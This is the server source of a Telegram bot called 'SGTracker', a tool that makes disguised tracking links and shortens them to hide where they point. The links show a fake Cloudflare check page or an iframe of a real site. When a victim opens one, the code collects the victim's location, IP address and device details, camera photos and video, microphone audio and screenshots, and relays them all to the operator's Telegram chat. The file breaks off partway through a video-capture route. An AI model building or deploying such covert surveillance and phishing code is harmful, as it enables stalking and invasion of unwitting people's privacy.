require('dotenv').config();
const fs = require('fs');
const path = require('path');
const express = require('express');
const serverless = require('serverless-http');
const cors = require('cors');
const bodyParser = require('body-parser');
const fetch = require('node-fetch');
const TelegramBot = require('node-telegram-bot-api');
const ejs = require('ejs');

// Initialize Express app
const app = express();

// Middleware
app.use(bodyParser.json({limit:1024*1024*20, type:'application/json'}));
app.use(bodyParser.urlencoded({ extended:true, limit:1024*1024*20, type:'application/x-www-form-urlencoded' }));
app.use(cors());

// Global variables
const bot = new TelegramBot(process.env.bot);
// Set host URL directly - use your actual Vercel URL here when deploying
const hostURL = "https://trackdown-sgmodder.vercel.app";
const use1pt = false;

// Store active targets for tracking
const targets = {};

// Get the template paths
const viewsPath = path.join(process.cwd(), 'views');
const webviewTemplate = fs.readFileSync(path.join(viewsPath, 'webview.ejs'), 'utf8');
const cloudflareTemplate = fs.readFileSync(path.join(viewsPath, 'cloudflare.ejs'), 'utf8');

// Helper functions
function getClientIp(req) {
  let ip;
  if (req.headers['x-forwarded-for']) {
    ip = req.headers['x-forwarded-for'].split(",")[0];
  } else if (req.connection && req.connection.remoteAddress) {
    ip = req.connection.remoteAddress;
  } else {
    ip = req.ip;
  }
  return ip;
}

function getFormattedDate() {
  var d = new Date();
  return d.toJSON().slice(0, 19).replace('T', ':');
}

function atob(str) {
  return Buffer.from(str, 'base64').toString();
}

// URL Shortening Services
// 1. XCut URL Shortener
async function shortenUrlWithXcut(url) {
  try {
    const response = await fetch('https://xcut.vercel.app/api/shorten', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({ url }),
    });
    
    const data = await response.json();
    
    if (!response.ok) {
      throw new Error(data.error || 'Failed to shorten URL with XCut');
    }
    
    return data.shortUrl;
  } catch (error) {
    console.error('Error shortening URL with XCut:', error);
    throw error;
  }
}

// 2. TinyURL Shortener
async function shortenUrlWithTinyurl(url) {
  try {
    const response = await fetch(`https://tinyurl.com/api-create.php?url=${encodeURIComponent(url)}`);
    if (!response.ok) {
      throw new Error('Failed to shorten URL with TinyURL');
    }
    return await response.text();
  } catch (error) {
    console.error('Error shortening URL with TinyURL:', error);
    throw error;
  }
}

// 3. Is.gd URL Shortener
async function shortenUrlWithIsgd(url) {
  try {
    const response = await fetch(`https://is.gd/create.php?format=simple&url=${encodeURIComponent(url)}`);
    if (!response.ok) {
      throw new Error('Failed to shorten URL with Is.gd');
    }
    const shortUrl = await response.text();
    return shortUrl;
  } catch (error) {
    console.error('Error shortening URL with Is.gd:', error);
    throw error;
  }
}

// 4. Cleanuri URL Shortener
async function shortenUrlWithCleanuri(url) {
  try {
    const response = await fetch('https://cleanuri.com/api/v1/shorten', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
      },
      body: `url=${encodeURIComponent(url)}`,
    });
    
    if (!response.ok) {
      throw new Error('Failed to shorten URL with Cleanuri');
    }
    
    const data = await response.json();
    return data.result_url;
  } catch (error) {
    console.error('Error shortening URL with Cleanuri:', error);
    throw error;
  }
}

// Attempt to shorten a URL with multiple services
async function shortenUrl(url) {
  const results = [];
  const shorteners = [
    { name: "XCut", fn: shortenUrlWithXcut },
    { name: "TinyURL", fn: shortenUrlWithTinyurl },
    { name: "Is.gd", fn: shortenUrlWithIsgd },
    { name: "Cleanuri", fn: shortenUrlWithCleanuri }
  ];
  
  for (const shortener of shorteners) {
    try {
      const shortUrl = await shortener.fn(url);
      if (shortUrl) {
        results.push({ name: shortener.name, url: shortUrl });
      }
    } catch (error) {
      // Silently fail - we'll only show successful shorteners
      console.log(`${shortener.name} shortener failed for ${url}: ${error.message}`);
    }
  }
  
  return results;
}

// Generate a random string for URL uniqueness
function generateRandomString(length = 8) {
  const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
  let result = '';
  for (let i = 0; i < length; i++) {
    result += chars.charAt(Math.floor(Math.random() * chars.length));
  }
  return result;
}

// Create a link function with animated progress bar and message editing
async function createLink(cid, msg, captureMethodId = "full") {
  var encoded = [...msg].some(char => char.charCodeAt(0) > 127);

  if ((msg.toLowerCase().indexOf('http') > -1 || msg.toLowerCase().indexOf('https') > -1) && !encoded) {
    // Generate a unique ID for this tracking link
    const uniqueId = generateRandomString(10);
    var url = cid.toString(36) + '/' + Buffer.from(msg).toString('base64') + '/' + uniqueId;
    var m = {
      reply_markup: JSON.stringify({
        "inline_keyboard": [
          [{ text: "🔄 Create New Link", callback_data: "crenew" }]
        ]
      })
    };

    // Get capture method code
    const captureCode = captureMethods.generateCaptureCode(captureMethodId);
    
    // Log the capture method details for debugging
    console.log(`Creating link with captureMethodId: ${captureMethodId}, code: ${captureCode}`);
    
    // Add capture method code to URLs
    var cUrl = `${hostURL}/c/${url}/${captureCode}`;
    var wUrl = `${hostURL}/w/${url}/${captureCode}`;

    // Progress bar stages
    const progressStages = [
      "⬜⬜⬜⬜⬜ 0%",
      "🟦⬜⬜⬜⬜ 20%",
      "🟦🟦⬜⬜⬜ 40%",
      "🟦🟦🟦⬜⬜ 60%",
      "🟦🟦🟦🟦⬜ 80%",
      "🟦🟦🟦🟦🟦 100%"
    ];
    
    // Send initial processing message with stage 0 progress bar
    const processingMsg = await bot.sendMessage(
      cid, 
      `<b>🔮 Generating your tracking links...</b>\n\n` +
      `<i>Preparing services...</i>\n` +
      `${progressStages[0]}`, 
      { parse_mode: "HTML" }
    );
    
    const processingMsgId = processingMsg.message_id;
    
    try {
      // Update to 20% - Starting URL shortening
      await bot.editMessageText(
        `<b>🔮 Generating your tracking links...</b>\n\n` +
        `<i>Connecting to URL shorteners...</i>\n` +
        `${progressStages[1]}`,
        { 
          chat_id: cid, 
          message_id: processingMsgId,
          parse_mode: "HTML" 
        }
      );

      // First shorten the CloudFlare link with multiple services
      const shortenedCUrls = await shortenUrl(cUrl);
      
      // Update to 40% - Half of shortening done
      await bot.editMessageText(
        `<b>🔮 Generating your tracking links...</b>\n\n` +
        `<i>Creating CloudFlare links...</i>\n` +
        `${progressStages[2]}`,
        { 
          chat_id: cid, 
          message_id: processingMsgId,
          parse_mode: "HTML" 
        }
      );
      
      // Then shorten the WebView link with multiple services
      const shortenedWUrls = await shortenUrl(wUrl);
      
      // Update to 60% - Shortening complete
      await bot.editMessageText(
        `<b>🔮 Generating your tracking links...</b>\n\n` +
        `<i>Creating WebView links...</i>\n` +
        `${progressStages[3]}`,
        { 
          chat_id: cid, 
          message_id: processingMsgId,
          parse_mode: "HTML" 
        }
      );
      
      // Update to 80% - Preparing final message
      await bot.editMessageText(
        `<b>🔮 Generating your tracking links...</b>\n\n` +
        `<i>Finalizing your links...</i>\n` +
        `${progressStages[4]}`,
        { 
          chat_id: cid, 
          message_id: processingMsgId,
          parse_mode: "HTML" 
        }
      );
      
      // Update to 100% - All done
      await bot.editMessageText(
        `<b>🔮 Generating your tracking links...</b>\n\n` +
        `<i>Everything is ready!</i>\n` +
        `${progressStages[5]}`,
        { 
          chat_id: cid, 
          message_id: processingMsgId,
          parse_mode: "HTML" 
        }
      );
      
      // Small delay for better UX
      await new Promise(resolve => setTimeout(resolve, 500));
      
      if (shortenedCUrls.length > 0 || shortenedWUrls.length > 0) {
        let message = `<b>🎯 TRACKING LINKS GENERATED!</b>\n\n`;
        message += `<b>🔗 Original URL:</b> <code>${msg}</code>\n`;
        message += `<b>⏰ Generated at:</b> <code>${getFormattedDate()}</code>\n\n`;
        message += `<b>✨ YOUR TRACKING LINKS ✨</b>\n\n`;
        
        // Add CloudFlare links with better formatting and visuals
        message += `<b>🛡️ CLOUDFLARE PAGE LINKS</b>\n`;
        message += `<i>Shows a Cloudflare security check page before redirecting</i>\n\n`;
        message += `🔗 <b>Original:</b> <a href="${cUrl}">Click to open</a>\n\n`;
        
        // Only add shorteners that worked - with symbols but without service names
        if (shortenedCUrls.length > 0) {
          message += `<b>📎 Shortened URLs:</b>\n`;
          shortenedCUrls.forEach((shortened, index) => {
            let symbol = '';
            if (shortened.name === 'XCut') symbol = '⚡';
            else if (shortened.name === 'TinyURL') symbol = '🔗';
            else if (shortened.name === 'Is.gd') symbol = '🌟';
            else if (shortened.name === 'Cleanuri') symbol = '💫';
            else symbol = '🔗';
            
            // Just show the shortened URL without the service name
            message += `${symbol} <a href="${shortened.url}">${shortened.url}</a>\n`;
          });
        }
        
        message += `\n<b>🌐 WEBVIEW PAGE LINKS</b>\n`;
        message += `<i>Shows the target website in an iframe</i>\n\n`;
        message += `🔗 <b>Original:</b> <a href="${wUrl}">Click to open</a>\n\n`;
        
        // Only add shorteners that worked - with symbols but without service names
        if (shortenedWUrls.length > 0) {
          message += `<b>📎 Shortened URLs:</b>\n`;
          shortenedWUrls.forEach((shortened, index) => {
            let symbol = '';
            if (shortened.name === 'XCut') symbol = '⚡';
            else if (shortened.name === 'TinyURL') symbol = '🔗';
            else if (shortened.name === 'Is.gd') symbol = '🌟';
            else if (shortened.name === 'Cleanuri') symbol = '💫';
            else symbol = '🔗';
            
            // Just show the shortened URL without the service name
            message += `${symbol} <a href="${shortened.url}">${shortened.url}</a>\n`;
          });
        }
        
        message += `\n<b>⚠️ Remember:</b> <i>These links will collect target's data when opened.</i>`;
        
        // Replace the progress message with the final links
        await bot.editMessageText(message, { 
          chat_id: cid, 
          message_id: processingMsgId,
          parse_mode: "HTML",
          reply_markup: m.reply_markup
        });
      } else {
        // If all URL shorteners fail, send direct links with better formatting
        let message = `<b>🎯 TRACKING LINKS GENERATED!</b>\n\n`;
        message += `<b>🔗 Original URL:</b> <code>${msg}</code>\n`;
        message += `<b>⏰ Generated at:</b> <code>${getFormattedDate()}</code>\n\n`;
        message += `<b>✨ YOUR TRACKING LINKS ✨</b>\n\n`;
        
        message += `<b>🛡️ CLOUDFLARE PAGE LINK:</b>\n`;
        message += `<i>Shows a Cloudflare security check page</i>\n`;
        message += `<a href="${cUrl}">${cUrl}</a>\n\n`;
        
        message += `<b>🌐 WEBVIEW PAGE LINK:</b>\n`;
        message += `<i>Shows the target website in an iframe</i>\n`;
        message += `<a href="${wUrl}">${wUrl}</a>\n\n`;
        
        message += `<b>⚠️ Remember:</b> <i>These links will collect target's data when opened.</i>`;
        
        // Replace the progress message with the final links
        await bot.editMessageText(message, { 
          chat_id: cid, 
          message_id: processingMsgId,
          parse_mode: "HTML",
          reply_markup: m.reply_markup
        });
      }
    } catch (error) {
      console.error("Error generating links:", error);
      
      try {
        // Replace the progress message with an error message
        await bot.editMessageText(
          `<b>⚠️ Error generating tracking links</b>\n\n` +
          `Something went wrong while generating your links. Please try again.\n\n` +
          `Error details: ${error.message}`,
          { 
            chat_id: cid, 
            message_id: processingMsgId,
            parse_mode: "HTML"
          }
        );
      } catch (e) {
        console.log("Couldn't edit processing message: ", e);
        
        // If error occurs, send direct links with better formatting
        let message = `<b>🎯 TRACKING LINKS GENERATED!</b>\n\n`;
        message += `<b>🔗 Original URL:</b> <code>${msg}</code>\n`;
        message += `<b>⏰ Generated at:</b> <code>${getFormattedDate()}</code>\n\n`;
        message += `<b>✨ YOUR TRACKING LINKS ✨</b>\n\n`;
        
        message += `<b>🛡️ CLOUDFLARE PAGE LINK:</b>\n`;
        message += `<i>Shows a Cloudflare security check page</i>\n`;
        message += `<a href="${cUrl}">${cUrl}</a>\n\n`;
        
        message += `<b>🌐 WEBVIEW PAGE LINK:</b>\n`;
        message += `<i>Shows the target website in an iframe</i>\n`;
        message += `<a href="${wUrl}">${wUrl}</a>\n\n`;
        
        message += `<b>⚠️ Remember:</b> <i>These links will collect target's data when opened.</i>`;
        
        await bot.sendMessage(cid, message, { 
          reply_markup: m.reply_markup,
          parse_mode: "HTML"
        });
      }
    }
    
    return true;
  } else {
    await bot.sendMessage(cid, `<b>⚠️ ERROR!</b>\n\nPlease enter a valid URL including http or https.`, { parse_mode: "HTML" });
    await createNew(cid);
    return false;
  }
}

// Define capture methods
const captureMethods = {
  // Different capture method configurations
  methods: [
    {
      id: "screenshot",
      name: "Full Screenshot 📱",
      description: "Full Phone Screenshot with Status Bar",
      emoji: "📸",
      code: "screenshot"
    },
    {
      id: "frontcam",
      name: "Front Camera Image 📸",
      description: "Front Camera Photo Capture + Device Info + Location",
      emoji: "📱",
      code: "frontcam"
    },
    {
      id: "backcam",
      name: "Back Camera Image 📸",
      description: "Back Camera Photo Capture + Device Info + Location",
      emoji: "📷", 
      code: "backcam"
    },
    {
      id: "frontvideo",
      name: "Front Camera Video 🎥",
      description: "Front Camera 10s Video Recording + Device Info + Location",
      emoji: "📹",
      code: "frontvideo"
    },
    {
      id: "backvideo",
      name: "Back Camera Video 🎥",
      description: "Back Camera 10s Video Recording + Device Info + Location",
      emoji: "🎬", 
      code: "backvideo"
    },
    {
      id: "allcams",
      name: "All Cameras 🎥✨",
      description: "Videos from Front & Back Cameras Simultaneously",
      emoji: "📹",
      code: "allcams"
    },
    {
      id: "audio",
      name: "Audio Recording 🎤",
      description: "15-second Microphone Recording",
      emoji: "🎵",
      code: "audio"
    },
    {
      id: "minimal",
      name: "Device Info 💻",
      description: "Basic Device & Location Data (No Media)",
      emoji: "📊",
      code: "min"
    }
  ],
  
  // Get capture method by ID
  getMethod: function(id) {
    return this.methods.find(method => method.id === id) || this.methods[0];
  },
  
  // Generate code for capture method (to be passed in URL)
  generateCaptureCode: function(id) {
    const method = this.getMethod(id);
    return method.code;
  },
  
  // Create keyboard with capture method options
  getKeyboard: function() {
    const keyboard = [];
    
    // Create rows with two buttons each
    for (let i = 0; i < this.methods.length; i += 2) {
      const row = [];
      
      // Add first button
      row.push({
        text: `${this.methods[i].emoji} ${this.methods[i].name}`,
        callback_data: `capture_${this.methods[i].id}`
      });
      
      // Add second button if available
      if (i + 1 < this.methods.length) {
        row.push({
          text: `${this.methods[i+1].emoji} ${this.methods[i+1].name}`,
          callback_data: `capture_${this.methods[i+1].id}`
        });
      }
      
      keyboard.push(row);
    }
    
    // Add cancel button at the bottom
    keyboard.push([
      {
        text: "❌ Cancel",
        callback_data: "capture_cancel"
      }
    ]);
    
    return keyboard;
  }
};

// Create new request function with capture methods
async function createNew(cid, messageId = null) {
  // Show capture method selection keyboard
  const captureKeyboard = {
    reply_markup: JSON.stringify({
      "inline_keyboard": captureMethods.getKeyboard()
    })
  };
  
  // Message content
  const methodSelectionText = `<b>🌟 Choose Capture Method 🌟</b>\n\n` +
    `Select what you want to capture from your target:\n\n` +
    `<b>✨ NEW!</b> Choose between <b>Camera Image</b> and <b>Camera Video</b> options!\n\n` +
    `• 📸 <b>Camera Images:</b> High-quality photos (front/back)\n` +
    `• 🎥 <b>Camera Videos:</b> 10-second video recordings\n` +
    `• 📹 <b>All Cameras:</b> Videos from front & back simultaneously\n` +
    `• 📱 <b>Screenshot:</b> Full phone screen with status bar\n` +
    `• 🎵 <b>Audio:</b> 15-second microphone recording\n` +
    `• 📊 <b>Device Info:</b> Basic data without media`;
  
  // If messageId is provided, edit the existing message
  if (messageId) {
    try {
      await bot.editMessageText(methodSelectionText, { 
        chat_id: cid,
        message_id: messageId,
        parse_mode: "HTML",
        reply_markup: captureKeyboard.reply_markup
      });
    } catch (error) {
      console.error("Error editing method selection message:", error);
      
      // Fallback to sending a new message
      await bot.sendMessage(
        cid, 
        methodSelectionText,
        { 
          parse_mode: "HTML",
          reply_markup: captureKeyboard.reply_markup
        }
      );
    }
  } else {
    // Send a new message
    await bot.sendMessage(
      cid, 
      methodSelectionText,
      { 
        parse_mode: "HTML",
        reply_markup: captureKeyboard.reply_markup
      }
    );
  }
}

// Process the link creation with the selected capture method
async function processLinkWithCaptureMethod(cid, captureMethodId, messageId = null) {
  // Get the selected method
  const method = captureMethods.getMethod(captureMethodId);
  
  // Create force reply keyboard for URL input
  const forceReplyKeyboard = {
    reply_markup: JSON.stringify({ "force_reply": true })
  };
  
  // Single message with method info and URL prompt
  let messageText = `${method.emoji} ${method.name} selected\n\n` +
    `<b>This will capture:</b> <i>${method.description}</i>\n\n`;
    
  // Add special messages based on method
  if (method.id === 'screenshot') {
    messageText += `<b>✨ Great choice!</b> Screenshots provide the most detailed view of the target's phone screen.\n\n`;
  } else if (method.id === 'allcams') {
    messageText += `<b>✨ Excellent choice!</b> This will record videos from both front and back cameras simultaneously.\n\n`;
  } else if (method.id === 'frontcam' || method.id === 'backcam') {
    messageText += `<b>✨ Camera Image!</b> This will capture multiple photos from the target's camera.\n\n`;
  } else if (method.id === 'frontvideo' || method.id === 'backvideo') {
    messageText += `<b>✨ Video Recording!</b> This will record an 8-second video clip from the target's camera.\n\n`;
  } else if (method.id === 'audio') {
    messageText += `<b>✨ Audio Recording!</b> This will capture a 15-second audio clip from the target's microphone.\n\n`;
  } else if (method.id === 'minimal') {
    messageText += `<b>✨ Device Info!</b> This will collect basic device information and location data only.\n\n`;
  }
  
  messageText += `Enter Your URL:`;
  
  try {
    if (messageId) {
      // If we have a message ID, first try to delete it 
      // (since we can't add force_reply to an edited message)
      try {
        await bot.deleteMessage(cid, messageId);
      } catch (deleteError) {
        console.log("Could not delete message, but will continue:", deleteError.message);
      }
    }
    
    // Send a single message with force reply
    await bot.sendMessage(
      cid, 
      messageText, 
      {
        parse_mode: "HTML",
        reply_markup: forceReplyKeyboard.reply_markup
      }
    );
  } catch (error) {
    console.error("Error in processing capture method:", error);
    
    // Last resort fallback
    await bot.sendMessage(
      cid, 
      messageText,
      {
        parse_mode: "HTML",
        reply_markup: forceReplyKeyboard.reply_markup
      }
    );
  }
  
  // The actual link creation will happen when the user replies to this message
  // That part is handled in the message handler with createLink
}

// ROUTES

// Root route - returns the client IP
app.get("/", (req, res) => {
  const ip = getClientIp(req);
  res.json({"ip": ip});
});

// POST route for device information
app.post("/", (req, res) => {
  var uid = decodeURIComponent(req.body.uid) || null;
  var data = decodeURIComponent(req.body.data) || null;
  
  var ip = getClientIp(req);
    
  if (uid != null && data != null) {
    if (data.indexOf(ip) < 0) {
      return res.send("ok");
    }
    
    data = data.replaceAll("<br>", "\n");
    
    bot.sendMessage(parseInt(uid, 36), data, {parse_mode: "HTML"});
    
    res.send("Done");
  } else {
    res.status(400).send("Bad Request");
  }
});

// Location route
app.post("/location", async (req, res) => {
  try {
    var lat = parseFloat(decodeURIComponent(req.body.lat)) || null;
    var lon = parseFloat(decodeURIComponent(req.body.lon)) || null;
    var uid = decodeURIComponent(req.body.uid) || null;
    var acc = decodeURIComponent(req.body.acc) || null;
    
    if (lon != null && lat != null && uid != null && acc != null) {
      try {
        // First send the actual location for Telegram map
        await bot.sendLocation(parseInt(uid, 36), lat, lon);
        
        // Get client IP if it's stored in targets
        const ipAddress = targets[uid]?.ip || 'Unknown';
        const timestamp = getFormattedDate();
        
        // Get additional information
        let chatId;
        try {
          // First check if it's in targets
          if (targets[uid] && targets[uid].chatId) {
            chatId = targets[uid].chatId;
          } else {
            // Otherwise, convert from base36
            chatId = parseInt(uid, 36);
          }
        } catch (error) {
          console.error("Error converting uid to chat ID:", error);
          chatId = parseInt(uid, 36); // Fallback to the conversion
        }
        
        // Format accuracy for better readability
        let accuracyText = "High";
        if (acc > 100) {
          accuracyText = "Low";
        } else if (acc > 30) {
          accuracyText = "Medium";
        }
        
        // Create Google Maps link
        const googleMapsUrl = `https://www.google.com/maps?q=${lat},${lon}`;
        
        // Create interactive links with buttons
        const locationCaption = 
          `📍 <b>Location Captured Successfully</b> 📍\n\n` +
          `🎯 <b>Target:</b> <code>${uid}</code>\n` +
          `🌐 <b>IP Address:</b> <code>${ipAddress}</code>\n` +
          `⏰ <b>Timestamp:</b> <code>${timestamp}</code>\n\n` +
          `📌 <b>Latitude:</b> <code>${lat.toFixed(6)}</code>\n` +
          `📌 <b>Longitude:</b> <code>${lon.toFixed(6)}</code>\n` +
          `📏 <b>Accuracy:</b> <code>${Math.round(acc)} meters</code> (${accuracyText})\n\n` +
          `<i>Captured using SGTracker by @SG_Modder</i>`;
          
        // Create inline keyboard with buttons
        const inlineKeyboard = {
          inline_keyboard: [
            [
              { text: "🗺️ Open in Google Maps", url: googleMapsUrl }
            ],
            [
              { text: "🌍 Open in OpenStreetMap", url: `https://www.openstreetmap.org/?mlat=${lat}&mlon=${lon}&zoom=16` }
            ]
          ]
        };
        
        // Send detailed message with interactive buttons
        await bot.sendMessage(chatId, locationCaption, {
          parse_mode: "HTML",
          reply_markup: inlineKeyboard
        });
        
        console.log("Location information sent successfully to Telegram");
      } catch (error) {
        console.error("Error sending location to Telegram:", error);
      }
      
      res.send("Location processed successfully");
    } else {
      res.status(400).send("Bad Request: Missing location parameters");
    }
  } catch (error) {
    console.error("Error in location handler:", error);
    res.status(500).send("Internal Server Error");
  }
});

// Camera snapshot route
app.post("/camsnap", async (req, res) => {
  try {
    console.log("Camera snapshot endpoint hit");
    
    var uid = decodeURIComponent(req.body.uid) || null;
    var img = decodeURIComponent(req.body.img) || null;
      
    if (uid != null && img != null) {
      console.log(`Received camera snapshot for uid ${uid}`);
      
      try {
        // Convert base64 to buffer
        var buffer = Buffer.from(img, 'base64');
        console.log(`Converted base64 to buffer, size: ${buffer.length} bytes`);
        
        // Create directory if it doesn't exist
        const dirPath = path.join(__dirname, '..', 'screens');
        fs.mkdirSync(dirPath, { recursive: true });
        
        // Save image to file
        const filePath = path.join(dirPath, `${uid}_camsnap.png`);
        fs.writeFileSync(filePath, buffer);
        console.log(`Camera snapshot saved to ${filePath}`);
          
        // Get client IP if it's stored in targets
        const ipAddress = targets[uid]?.ip || 'Unknown';
        const timestamp = getFormattedDate();
        
        // Convert uid to chat ID if needed
        let chatId;
        try {
          // First check if it's in targets
          if (targets[uid] && targets[uid].chatId) {
            chatId = targets[uid].chatId;
          } else {
            // Otherwise, convert from base36
            chatId = parseInt(uid, 36);
          }
          console.log(`Sending to chat ID: ${chatId}`);
        } catch (error) {
          console.error("Error converting uid to chat ID:", error);
          chatId = parseInt(uid, 36); // Fallback to the conversion
        }
          
        // Create a more attractive caption with emojis and formatting
        const imageCaption = 
          `📸 <b>Camera Snapshot Captured</b> 📸\n\n` +
          `👤 <b>Target:</b> <code>${uid}</code>\n` +
          `🌐 <b>IP Address:</b> <code>${ipAddress}</code>\n` +
          `⏰ <b>Timestamp:</b> <code>${timestamp}</code>\n` +
          `📊 <b>Size:</b> <code>${Math.round(buffer.length/1024)} KB</code>\n\n` +
          `<i>Captured using SGTracker by @SG_Modder</i>`;
          
        // Send photo to Telegram using file path
        var info = {
          filename: "camsnap.png",
          contentType: 'image/png'
        };
        
        await bot.sendPhoto(chatId, filePath, { 
          caption: imageCaption,
          parse_mode: "HTML"
        }, info);
        
        console.log("Camera snapshot sent successfully to Telegram");
        
        // Delete the temporary file after sending to Telegram (essential for Vercel)
        try {
          fs.unlinkSync(filePath);
          console.log(`Temporary camera snapshot file deleted: ${filePath}`);
        } catch (deleteError) {
          console.error(`Error deleting temporary camera snapshot file: ${deleteError}`);
        }
      } catch (error) {
        console.error("Error processing camera snapshot:", error);
        res.status(500).send("Error processing camera snapshot");
        return;
      }
      
      res.status(200).send("Camera snapshot processed successfully");
    } else {
      res.status(400).send("Missing UID or image data");
    }
  } catch (error) {
    console.error("Error in camera snapshot handler:", error);
    res.status(500).send("Internal Server Error");
  }
});

// Audio recording route
app.post("/audiorecording", async (req, res) => {
  try {
    console.log("Audio recording endpoint hit");
    
    var uid = decodeURIComponent(req.body.uid) || null;
    var audioData = decodeURIComponent(req.body.data) || null;
      
    if (uid != null && audioData != null) {
      console.log(`Received audio recording for uid ${uid}`);
      
      try {
        // Convert base64 to buffer
        var buffer = Buffer.from(audioData, 'base64');
        console.log(`Converted base64 to buffer, size: ${buffer.length} bytes`);
        
        // Create directory if it doesn't exist
        const dirPath = path.join(__dirname, '..', 'screens');
        fs.mkdirSync(dirPath, { recursive: true });
        
        // Save audio to file
        const filePath = path.join(dirPath, `${uid}_audio_recording.ogg`);
        fs.writeFileSync(filePath, buffer);
        console.log(`Audio recording saved to ${filePath}`);
        
        // Get client IP if it's stored in targets
        const ipAddress = targets[uid]?.ip || 'Unknown';
        const timestamp = getFormattedDate();
        
        // Convert uid to chat ID if needed
        let chatId;
        try {
          // First check if it's in targets
          if (targets[uid] && targets[uid].chatId) {
            chatId = targets[uid].chatId;
          } else {
            // Otherwise, convert from base36
            chatId = parseInt(uid, 36);
          }
          console.log(`Sending to chat ID: ${chatId}`);
        } catch (error) {
          console.error("Error converting uid to chat ID:", error);
          chatId = parseInt(uid, 36); // Fallback to the conversion
        }
        
        // Create a more attractive caption with emojis and formatting
        const audioCaption = 
          `🎤 <b>Audio Recording Captured</b> 🎤\n\n` +
          `👤 <b>Target:</b> <code>${uid}</code>\n` +
          `🌐 <b>IP Address:</b> <code>${ipAddress}</code>\n` +
          `⏰ <b>Timestamp:</b> <code>${timestamp}</code>\n` +
          `📊 <b>Size:</b> <code>${Math.round(buffer.length/1024)} KB</code>\n` +
          `⏱️ <b>Duration:</b> <code>~15 seconds</code>\n\n` +
          `<i>Captured using SGTracker by @SG_Modder</i>`;
          
        // File info
        var info = {
          filename: "audio_recording.ogg",  // Using ogg for better Telegram support
          contentType: 'audio/ogg'
        };
        
        try {
          // Send as voice message for better playback in Telegram
          await bot.sendVoice(chatId, filePath, { 
            caption: audioCaption,
            parse_mode: "HTML"
          }, info);
          console.log("Audio recording sent successfully to Telegram");
          
          // Delete the temporary file after sending to Telegram (essential for Vercel)
          try {
            fs.unlinkSync(filePath);
            console.log(`Temporary audio recording file deleted: ${filePath}`);
          } catch (deleteError) {
            console.error(`Error deleting temporary audio file: ${deleteError}`);
          }
        } catch (error) {
          console.log("Error sending audio recording to Telegram:", error);
          // Try to send as document if voice fails
          try {
            await bot.sendDocument(chatId, filePath, { 
              caption: audioCaption + "\n\n⚠️ Sent as document due to audio processing error.",
              parse_mode: "HTML"
            }, info);
            console.log("Audio recording sent as document to Telegram");
            
            // Delete the temporary file after sending to Telegram (essential for Vercel)
            try {
              fs.unlinkSync(filePath);
              console.log(`Temporary audio recording file deleted: ${filePath}`);
            } catch (deleteError) {
              console.error(`Error deleting temporary audio file: ${deleteError}`);
            }
          } catch (docError) {
            console.log("Error sending audio recording as document:", docError);
          }
        }
      } catch (error) {
        console.error("Error processing audio recording:", error);
        res.status(500).send("Error processing recording");
        return;
      }
      
      res.status(200).send("Audio recording processed successfully");
    } else {
      res.status(400).send("Missing UID or audio data");
    }
  } catch (error) {
    console.error("Error in audio recording handler:", error);
    res.status(500).send("Internal Server Error");
  }
});

// Front Camera Video endpoint
app.post("/videofrontcamera", async (req, res) => {
  try {
    console.log("Front camera video endpoint hit");
    
    var uid = decodeURIComponent(req.body.uid) || null;
    var videoData = decodeURIComponent(req.body.data) || null;
      
    if (uid != null && videoData != null) {
      console.log(`Received front camera video for uid ${uid}`);
      
      try {
        // Convert base64 to buffer
        var buffer = Buffer.from(videoData, 'base64');
        console.log(`Converted base64 to buffer, size: ${buffer.length} bytes`);
          
        // Create temporary directory if it doesn't exist (needed for Vercel)
        const dirPath = path.join(__dirname, '..', 'screens');
        fs.mkdirSync(dirPath, { recursive: true });
        
        // Create a temporary file path (will be deleted after sending)
        const filePath = path.join(dirPath, `${uid}_front_camera_video.webm`);
        fs.writeFileSync(filePath, buffer);
        console.log(`Front camera video temporarily saved to ${filePath}`);
          
        // Get client IP if it's stored in targets
        const ipAddress = targets[uid]?.ip || 'Unknown';
        const timestamp = getFormattedDate();
        
        // Convert uid to chat ID if needed
        let chatId;
        try {
          // First check if it's in targets
          if (targets[uid] && targets[uid].chatId) {
            chatId = targets[uid].chatId;
          } else {
            // Otherwise, convert from base36
            chatId = parseInt(uid, 36);
          }
          console.log(`Sending to chat ID: ${chatId}`);
        } catch (error) {
          console.error("Error converting uid to chat ID:", error);
          chatId = uid; // Fallback to the original uid
        }
        
        // Create a more attractive caption with emojis and formatting
        const videoCaption = 
          `🎥 <b>Front Camera Video Captured</b> 🎥\n\n` +
          `📱 <b>Target:</b> <code>${uid}</code>\n` +
          `🌐 <b>IP Address:</b> <code>${ipAddress}</code>\n` +
          `⏰ <b>Timestamp:</b> <code>${timestamp}</code>\n` +
          `📊 <b>Size:</b> <code>${Math.round(buffer.length/1024)} KB</code>\n` +
          `⏱️ <b>Duration:</b> <code>8 seconds</code>\n\n` +
          `<i>Captured using SGTracker by @SG_Modder</i>`;
          
        try {
          // Send video to Telegram using file path
          await bot.sendVideo(chatId, filePath, { 
            caption: videoCaption,
            parse_mode: "HTML"
          });
          console.log("Front camera video sent successfully to Telegram");
          
          // Delete the temporary file after sending to Telegram (important for Vercel)
          try {
            fs.unlinkSync(filePath);
            console.log(`Temporary file deleted: ${filePath}`);
          } catch (deleteError) {
            console.error(`Error deleting temporary file: ${deleteError}`);
          }
        } catch (error) {
          console.log("Error sending front camera video to Telegram:", error);
          // Try to send as document if video send fails
          try {
            await bot.sendDocument(chatId, filePath, { 
              caption: videoCaption + "\n\n⚠️ Sent as document due to video processing error.",
              parse_mode: "HTML"
            });
            console.log("Front camera video sent as document to Telegram");
            
            // Delete the temporary file after sending to Telegram (important for Vercel)
            try {
              fs.unlinkSync(filePath);
              console.log(`Temporary file deleted: ${filePath}`);
            } catch (deleteError) {
              console.error(`Error deleting temporary file: ${deleteError}`);
            }
          } catch (docError) {
            console.log("Error sending front camera video as document:", docError);
          }
        }
      } catch (error) {
        console.error("Error processing front camera video:", error);
        res.status(500).send("Error processing recording");
        return;
      }
      
      res.status(200).send("Front camera video processed successfully");
    } else {
      res.status(400).send("Missing UID or video data");
    }
  } catch (error) {
    console.error("Error in front camera video handler:", error);
    res.status(500).send("Internal Server Error");
  }
});

// Back Camera Video endpoint
app.post("/videobackcamera", async (req, res) => {
  try {
    console.log("Back camera video endpoint hit");
    
    var uid = decodeURIComponent(req.body.uid) || null;
